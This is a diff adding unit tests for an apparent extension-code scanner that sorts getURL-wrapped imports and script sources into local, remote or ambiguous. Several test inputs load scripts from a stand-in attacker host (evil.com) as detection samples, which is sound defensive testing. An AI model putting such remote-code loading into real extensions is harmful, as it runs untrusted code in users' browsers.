@@ -260,6 +260,91 @@ test("JS scan reports ambiguous (non-literal) cases for review", () => {
   );
 });
 
+// getURL resolves its argument against the extension's moz-extension:// base, so a
+// resource loaded through it with a fully-static RELATIVE argument - dynamic
+// import(), importScripts(), or a script element's src - is a local reference,
+// never remote/ambiguous. A relative literal or an uninterpolated template both
+// resolve, as do the deprecated extension.getURL alias and an aliased /
+// feature-detected API root (via the shared api-base index).
+test("JS scan treats getURL(<relative>) resources as local, not remote/ambiguous", () => {
+  const clean = (code) => {
+    const t = types(code);
+    assert.ok(
+      !t.some((x) => x.startsWith("remote-") || x.startsWith("ambiguous-")),
+      `${code} -> ${JSON.stringify(t)}`
+    );
+  };
+  // import() / importScripts() / script.src, each via getURL with a relative arg.
+  clean(`import(browser.runtime.getURL("popup.js"));`);
+  clean(`importScripts(browser.runtime.getURL("worker.js"));`);
+  clean(
+    `const s = document.createElement("script"); s.src = browser.runtime.getURL("inject.js");`
+  );
+  clean(
+    `const s = document.createElement("script"); s.setAttribute("src", browser.runtime.getURL("inject.js"));`
+  );
+  // An uninterpolated template literal argument is fully static -> resolved local.
+  clean("import(browser.runtime.getURL(`popup.js`));");
+  // The deprecated MV2 alias and the chrome/messenger roots resolve the same way.
+  clean(`import(chrome.extension.getURL("popup.js"));`);
+  clean(`importScripts(messenger.runtime.getURL("worker.js"));`);
+  // A captured/feature-detected root is resolved through the api-base index.
+  clean(`const rt = browser.runtime; import(rt.getURL("popup.js"));`);
+  clean(
+    `const api = messenger || browser; import(api.runtime.getURL("popup.js"));`
+  );
+});
+
+// getURL does NOT make a reference unconditionally local: an ABSOLUTE or
+// protocol-relative argument escapes the extension origin (getURL("https://x") ->
+// "https://x"), so it must still be flagged remote - a remote/exfil URL wrapped in
+// getURL is not masked. A getURL argument that cannot be resolved statically stays
+// ambiguous (the result cannot be proven local).
+test("JS scan flags getURL(<absolute>) as remote, keeps dynamic-arg getURL ambiguous", () => {
+  assert.ok(
+    types(`import(browser.runtime.getURL("https://evil.com/x.js"));`).includes(
+      "remote-import"
+    )
+  );
+  assert.ok(
+    types(`import(browser.runtime.getURL("//evil.com/x.js"));`).includes(
+      "remote-import"
+    )
+  );
+  assert.ok(
+    types(
+      `const s = document.createElement("script"); s.src = browser.runtime.getURL("https://evil.com/x.js");`
+    ).includes("remote-script-src")
+  );
+  // A fully computed argument (variable prefix) cannot be proven local -> ambiguous.
+  assert.ok(
+    types(`import(browser.runtime.getURL(feature + ".js"));`).includes(
+      "ambiguous-import"
+    )
+  );
+});
+
+// Over-suppression guards: getURL resolution must NOT swallow genuinely remote or
+// unresolvable references, nor a getURL that is not the real API method (a bare
+// call, a method on some other object, or a shadowed API-root binding).
+test("JS scan getURL resolution does not over-suppress", () => {
+  // Real remote / dynamic references still fire.
+  assert.ok(types(`import("https://cdn/m.js");`).includes("remote-import"));
+  assert.ok(types(`import(base + "/x.js");`).includes("ambiguous-import"));
+  // A bare getURL (not rooted at an API object) is unresolvable -> ambiguous.
+  assert.ok(types(`import(getURL("x.js"));`).includes("ambiguous-import"));
+  // getURL on an unrelated object is not the API method.
+  assert.ok(
+    types(`import(myObj.getURL("x.js"));`).includes("ambiguous-import")
+  );
+  // A shadowed API-root binding (function param) is not the global -> ambiguous.
+  assert.ok(
+    types(
+      `function f(browser){ import(browser.runtime.getURL("x.js")); }`
+    ).includes("ambiguous-import")
+  );
+});
+
 // eval-family sinks still flag when accessed via window/globalThis/self
 // (window.eval, self.importScripts, window.setTimeout string, new window.Function),
 // but an eval method on a non-global object and a non-string global timer do not.
